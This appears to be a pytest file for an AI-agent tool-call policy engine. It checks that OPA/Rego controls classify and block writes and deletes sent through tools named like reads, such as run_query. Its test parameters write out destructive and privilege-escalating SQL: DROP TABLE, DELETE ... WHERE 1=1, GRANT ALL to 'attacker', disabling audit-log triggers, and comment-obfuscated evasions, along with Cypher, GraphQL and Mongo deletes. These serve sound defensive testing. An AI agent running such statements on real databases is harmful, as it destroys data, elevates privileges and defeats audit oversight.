    # ...and the same shape WITH a destructive statement is caught, cycle or not.
    cyclic2: dict = {"sql": "DROP TABLE users"}
    cyclic2["again"] = cyclic2
    assert classify_tool("run_query", cyclic2)[0] is Verb.DELETE


def test_the_strict_parity_rows_carry_the_verb_the_engine_publishes() -> None:
    """strict_parity_test.rego feeds `derived.verb` by hand (`_norm` adds none), so the verbs written
    there must be what classify_tool returns for those exact calls, or the rego row guards a fiction."""
    import re

    text = (REPO_ROOT / "webhook" / "presets" / "strict_parity_test.rego").read_text(encoding="utf-8")
    rows = re.findall(
        r'"tool_name":\s*"(\w+)",\s*"tool_params":\s*(\{[^{}]*\}),\s*"derived":\s*\{"verb":\s*"(\w+)"\}', text)
    assert len(rows) >= 2, "the over-classification rows lost their derived.verb"
    for tool_name, params, verb in rows:
        assert _derived(tool_name, json.loads(params))["verb"] == verb, tool_name


# ── the same, through the shipped controls that key on `verb != "read"` ──────────────────────────

_MCP_CONTEXT = {"server": "reporting-kb", "transport": "stdio", "definition_seen": True, "pin_status": "pinned"}


def _verb_gated_controls() -> dict[str, tuple[str, str, tuple[str, str]]]:
    """name -> (rego, package, the (decision, rule_id) a WRITE through it must get). `reporting-kb` is
    registered and NOT writable in all three, the state a read-only integration is in."""
    from norviq.api import mcp_controls

    template = (REPO_ROOT / "policies" / "templates" / "read-only-intent-deny-by-default.rego").read_text(
        encoding="utf-8")
    scoped = template.replace('startswith(lower(input.tool_name), "milvus_")', "true")
    assert scoped != template, "the read-only template's scope line moved; rescope it here"
    guardrail = (REPO_ROOT / "policies" / "templates" / "mcp_integration_guardrail.rego").read_text(
        encoding="utf-8")
    return {
        "mcp_controls": (mcp_controls.compile(["reporting-kb"], []), "norviq.mcp_registry",
                         ("block", "mcp_unapproved_write_server")),
        "read-only intent": (scoped, "norviq.custom", ("block", "read_only_intent")),
        "integration guardrail": (guardrail, "norviq.guardrail.mcp_integration",
                                  ("block", "mcp_unapproved_write_server")),
    }


def _mcp_decide(policy_text: str, package: str, tool_name: str, params: dict) -> tuple[str, str, str]:
    event = ToolCallEvent(
        tool_name=tool_name, tool_params=params, mcp=dict(_MCP_CONTEXT),
        agent_identity=AgentIdentity(spiffe_id="spiffe://cluster.local/ns/agents/sa/support",
                                     namespace="agents", agent_class="support-agent"),
    )
    doc = OPAEvaluator.__new__(OPAEvaluator)._build_input(event, SimpleNamespace(score=0.8, category="high"))
    with tempfile.TemporaryDirectory() as tmp:
        policy = Path(tmp) / "policy.rego"
        policy.write_text(policy_text, encoding="utf-8")
        path = Path(tmp) / "input.json"
        path.write_text(json.dumps(doc), encoding="utf-8")
        out = subprocess.run(
            ["opa", "eval", "-f", "raw", "--v0-compatible", "-d", str(policy), "-i", str(path),
             f"[data.{package}.decision, data.{package}.rule_id]"],
            capture_output=True, text=True, check=True,
        )
    decision, rule_id = json.loads(out.stdout.strip())
    return doc["derived"]["verb"], decision, rule_id


@pytestmark_opa
@pytest.mark.parametrize("control", ["mcp_controls", "read-only intent", "integration guardrail"])
@pytest.mark.parametrize("tool_name,sql,verb", [
    ("run_query", "UPDATE users SET role = 'admin' WHERE id = 7", "write"),
    ("run_query", "INSERT INTO grants(user_id, role) VALUES (7, 'admin')", "write"),
    ("execute_query", "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker", "write"),
    ("execute_query", "ALTER TABLE audit_log DISABLE TRIGGER ALL", "write"),
    ("run_query", "DELETE FROM customers WHERE 1=1", "delete"),
    ("execute_query", "DROP TABLE users", "delete"),
    # the second-review evasions that classified read before and passed all three
    ("run_query", "SELECT '--'; /* x */UPDATE/**/users/**/SET/**/role='admin' WHERE id=7", "write"),
    ("run_query", "WITH x AS (DELETE/**/FROM customers RETURNING 1) SELECT 1", "delete"),
    ("run_query", "DO E'BEGIN UPDATE users SET role=''admin''; END'", "delete"),
    ("run_query", "DELETE customers", "delete"),
])
def test_a_write_through_a_run_qualified_read_is_refused_by_the_verb_gated_controls(
    control: str, tool_name: str, sql: str, verb: str
) -> None:
    """The review's measurement, kept and extended with the evasions. Before 7.10 each was `delete` by
    its name and refused; the first cut made each `read` and ALLOWED by all three; now each is write or
    delete and refused again, with the baselines allowing the non-destructive ones so nothing else
    catches them."""
    text, package, refused = _verb_gated_controls()[control]
    assert _mcp_decide(text, package, tool_name, {"sql": sql}) == (verb, *refused)


@pytestmark_opa
@pytest.mark.parametrize("control", ["mcp_controls", "read-only intent", "integration guardrail"])
@pytest.mark.parametrize("params", [
    {"query": "MATCH (n) DETACH DELETE n"},
    {"query": "mutation { deleteUser(id: 7) { id } }"},
    {"collection": "users", "operation": "deleteMany", "filter": {}},
])
def test_a_nonsql_write_through_a_run_qualified_read_is_refused(control: str, params: dict) -> None:
    """B2: Cypher, GraphQL and Mongo writes through a `run_query`-named tool. Each was `read` and
    allowed by all three controls before the fail-closed rewrite (a Memgraph MCP server names its
    Cypher tool `run_query`)."""
    text, package, refused = _verb_gated_controls()[control]
    assert _mcp_decide(text, package, "run_query", params)[1:] == refused


@pytestmark_opa
@pytest.mark.parametrize("control,allowed", [
    ("mcp_controls", ("allow", "default_allow")),
    ("read-only intent", ("allow", "read_only_intent")),
    ("integration guardrail", ("allow", "default_allow")),
])
@pytest.mark.parametrize("tool_name,sql", [
    ("run_query", "select * from customers where id = 8812"),
    ("execute_query", "-- weekly report\nSELECT count(*) FROM orders"),
    ("run_query", "SELECT id, created_at, updated_at, update_count FROM jobs"),
])
def test_a_select_through_a_run_qualified_read_is_allowed_by_the_verb_gated_controls(
    control: str, allowed: tuple[str, str], tool_name: str, sql: str
) -> None:
    """...and 7.10 stays fixed under the same three: a positively-read payload is `read` and passes."""
    text, package, _refused = _verb_gated_controls()[control]
    assert _mcp_decide(text, package, tool_name, {"sql": sql}) == ("read", *allowed)


@pytestmark_opa
@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
@pytest.mark.parametrize("tool_name,params", [
    ("run_query", {"query": "DROP TABLE users"}),
    ("run_query", {"query": "DELETE FROM customers WHERE 1=1"}),
    ("run_query", {"query": "select 1; drop table users"}),
    ("run_query", {"payload": {"q": "drop table users"}}),
    ("execute_query", {"sql": "truncate table ledger"}),
])
def test_destructive_sql_through_a_run_qualified_read_is_refused_twice_over(
    tool_name: str, params: dict, policy_name: str, policy: Path
) -> None:
    """Two independent refusals of a destructive statement through a run-qualified read: the verb is
    `delete` (so every verb-gated control refuses it), AND the baselines' name-independent destructive-
    SQL detector fires regardless of verb."""
    assert _derived(tool_name, params)["verb"] == "delete"
    decision, rule_id = _decide(policy, tool_name, params)
    assert (decision, rule_id) == ("block", "deny_sql_injection"), (
        f"{tool_name} {params} was not refused by {policy_name}"
    )


# --- which names let the payload decide the verb -----------------------------------------------------
#
# The dry runs replay audit rows that kept no argument values. A predicate on `derived.verb` is then a
# predicate on the arguments too, for exactly the names where `classify_tool` reads the payload.
# `verb_reads_payload` states that set from the name alone, so it is held to `classify_tool` itself:
# a name it calls name-only must classify the same under every payload, and a name it flags must have
# some payload that moves the verb.

_PAYLOADS = (None, {}, {"q": "drop table orders"}, {"q": "update t set a = 1"}, {"q": "select 1"},
             {"url": "https://example.com"}, {"to": "someone@example.com"})


@pytest.mark.parametrize("name", [
    "acme_widget", "run_query", "execute_query", "run_update", "search_kb", "send_email",
    "delete_record", "open_breaker", "run_report", "run", "query", "export_data", "get_customer",
    "widget_sync",
])
def test_verb_reads_payload_agrees_with_classify_tool(name: str) -> None:
    from norviq.engine.capability import verb_reads_payload

    verbs = {classify_tool(name, payload)[0] for payload in _PAYLOADS}
    assert verb_reads_payload(name) is (len(verbs) > 1), (name, verbs)


def test_an_unresolved_name_takes_its_verb_from_the_payload() -> None:
    from norviq.engine.capability import verb_reads_payload

    assert verb_reads_payload("acme_widget") is True
    assert verb_reads_payload("run_query") is True
    assert verb_reads_payload("search_kb") is False
